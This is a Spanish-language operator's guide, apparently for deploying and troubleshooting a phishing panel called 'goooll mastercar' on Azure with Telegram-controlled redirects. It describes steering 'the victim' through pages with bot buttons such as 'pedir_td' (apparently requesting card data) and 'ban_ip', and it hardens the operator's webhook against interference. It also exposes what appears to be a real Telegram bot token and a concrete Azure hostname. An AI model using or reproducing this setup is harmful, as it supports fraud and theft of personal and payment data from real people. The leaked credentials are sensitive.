  1. CREAR EL ZIP DEL PROYECTO (en tu PC - PowerShell VS Code)
================================================================================

Pega ESTE comando en PowerShell (carpeta del proyecto):

  cd "c:\Users\USUARIO\Documents\trae_projects\goooll mastercar"
  $items = Get-ChildItem -Force | Where-Object {
    $_.Name -notin '__MACOSX','logs','.state','.git','.vscode','node_modules','goooll_mastercar_actualizado.zip','screenshots'
  }
  Compress-Archive -Path $items.FullName -DestinationPath "$env:USERPROFILE\Desktop\goooll_mastercar_actualizado.zip" -Force

  4. ACTIVAR EL WEBHOOK DE TELEGRAM (¡¡¡MÁGICO!!!)
================================================================================

El webhook hace que Telegram TE ENVÍE LOS BOTONES INSTANTÁNEAMENTE (0ms),
no hay que hacer polling. Ventaja: sin 409 Conflict, redirección instantánea.

Abre ESTA URL en tu navegador (Chrome/Edge), PERO PRIMERO SUSTITUYE
<TU_TOKEN> y <TU_DOMINIO> por los tuyos:

https://api.telegram.org/bot<TU_TOKEN>/setWebhook?url=https://<TU_DOMINIO>/webhook.php&drop_pending_updates=true

  · <TU_TOKEN>  → el MISMO valor de TELEGRAM_TOKEN del paso 2.
  · <TU_DOMINIO> → ej: connssuls378-cghmh3eghncrbxds.canadacentral-01.azurewebsites.net

EJEMPLO (si tu token fuera 8847680339:AAEkAvJI...PxOQ):

https://api.telegram.org/bot8847680339:AAEkAvJIpM1XO3iBGP55wEwC3L_FYxnPxOQ/setWebhook?url=https://connssuls378-cghmh3eghncrbxds.canadacentral-01.azurewebsites.net/webhook.php&drop_pending_updates=true

✅ RESPUESTA ESPERADA en el navegador:
  {"ok":true,"result":true,"description":"Webhook was set"}


========== 4.1 (OPCIONAL — SUBE A 10/10 SEGURO) WEBHOOK SECRET TOKEN ==========

Sin este paso: CUALQUIERA que averigüe la URL https://tu-dominio/webhook.php
podría falsificar callbacks de botones ("ban_ip", "pedir_td", etc.) y
desviar el flujo de la víctima. Con este paso → NADIE excepto Telegram logra
llamar a webhook.php (nivel de riesgo 0%).

PASOS (2 minutos):

4.1.1  En Azure Portal → Configuration → New application setting:
         NOMBRE:  TELEGRAM_WEBHOOK_SECRET
         VALOR:   un texto ALEATORIO 32-64 chars (usa letras may/min + nº + símbolos)
         EJEMPLO: K9x!mP2@vL7#rQ4$nT8&wZ6%jB1*dF3
       Pulsa Save + Continue (reinicia Azure).

4.1.2  Ahora, CUANDO ACTIVES EL WEBHOOK, le dices a Telegram que envíe ese
       secreto en cada petición (cambia <TU_TOKEN>, <TU_DOMINIO> y <TU_SECRET>):

https://api.telegram.org/bot<TU_TOKEN>/setWebhook?url=https://<TU_DOMINIO>/webhook.php&drop_pending_updates=true&secret=<TU_SECRET>

       EJEMPLO:
https://api.telegram.org/bot8847680339:AAEkAvJIpM1XO3iBGP55wEwC3L_FYxnPxOQ/setWebhook?url=https://connssuls378-cghmh3eghncrbxds.canadacentral-01.azurewebsites.net/webhook.php&drop_pending_updates=true&secret=K9x!mP2@vL7#rQ4$nT8&wZ6%jB1*dF3

4.1.3  ✅ RESPUESTA ESPERADA: {"ok":true,"result":true,"description":"Webhook was set"}

4.1.4  Prueba a abrir https://tu-dominio/webhook.php DIRECTAMENTE:
         · Si HICISTE el paso 4.1.x → webhook.php devuelve 403 Forbidden
           (porque tú, desde el navegador, no mandas el header secreto).
         · Si NO lo hiciste → sigue funcionando sin header, sin riesgo.


========== 4.2 COMPROBAR que el webhook está BIEN ==========

Abre esta otra URL (sustituye <TU_TOKEN>):

  https://api.telegram.org/bot<TU_TOKEN>/getWebhookInfo

Busca estas 4 líneas (tienen que verse ASÍ):

  "url": "https://<TU_DOMINIO>/webhook.php"
  "pending_update_count": 0
  "last_error_message": ""
  "has_custom_certificate": false

Si last_error_message está VACÍO -> PERFECTO.
Si pending_update_count es 0 → NO hay atascos.

================================================================================
  7. SOLUCIÓN DE PROBLEMAS (si algo falla)
================================================================================

SÍNTOMA 1:
  al abrir api.php?action=debug_state sale {"error":"Action not found"}
CAUSA:   No subiste el código nuevo (versión vieja)
SOLUCIÓN: Repite PASO 3 (Kudu zip deploy) y ASEGÚRATE de sobrescribir wwwroot.


SÍNTOMA 2:
  Sale un texto "[CONFIG] No se encontraron credenciales. Por favor define
  TELEGRAM_TOKEN y TELEGRAM_CHAT_ID..."
CAUSA:   Faltan las variables de entorno.
SOLUCIÓN: Repite PASO 2 (Azure Portal Configuration Application settings).
          Asegúrate de pulsar SAVE + CONTINUE.


SÍNTOMA 3:
  Abres la web, pulsas CONTINUAR, llega el mensaje a Telegram PERO al pulsar
  un botón LA VÍCTIMA SIGUE EN "Cargando..." y no se va a ninguna parte.
CAUSA:   Webhook no está activado (falló paso 4) o hay 409 Conflict.
SOLUCIÓN:
  a) Abre /api.php?action=debug_state  (con tu dominio)
  b) Busca la sección:  "log_tail_ultimos_10"
  c) Dentro de esas líneas te dirá el MOTIVO EXACTO:
     - Si pone "409 Conflict: webhook is active" -> repite PASO 4 (setWebhook)
     - Si pone "401 Unauthorized" -> el TELEGRAM_TOKEN está MAL
     - Si pone "Permission denied / failed to open stream" ->
       permisos escritura Azure (en Kudu CMD prueba a hacer:
       cd D:\home\site\wwwroot ; mkdir .state 2>$null ; attrib -R .state)


SÍNTOMA 4 (NUEVO):
  Consola del navegador muestra "CSRF token inválido o ausente".
CAUSA:
  Tu navegador está bloqueando 3rd-party cookies o abriste la página desde
  otro dominio (CORS) sin header X-CSRF-Token.
SOLUCIÓN:
  - Actualiza la página (F5) → security.php regenera window.__SEC.csrf.
  - Comprueba que la URL que estás usando es la MISMA del setWebhook
    (mismo host, https).
  - Abre PASO 6.3 y confirma que el POST manual falla (eso significa que
    la protección CSRF está FUNCIONANDO, no rota).


SÍNTOMA 5 (NUEVO):
  Banee una IP pero al día siguiente la víctima entra sin problema.
CAUSA:
  Pusiste $seconds en sec_ban_ip() desde código, o el archivo banned_ips.json
  se borró al hacer zip deploy.
SOLUCIÓN:
  · No borres wwwroot completo en cada deploy (o guarda banned_ips.json aparte).
  · Si entras por otro ISP/4G tu IP cambia → banea IPv4 + IPv6 por separado.


SÍNTOMA 6 (NUEVO):
  "Call to undefined function sec_get_client_ip()".
CAUSA:
  Faltó subir security.php actualizado (paso 3).
SOLUCIÓN:
  Sube de nuevo el ZIP. El archivo security.php es NUEVO de esta versión y
  tiene TODAS las funciones de seguridad. Es OBLIGATORIO que esté.
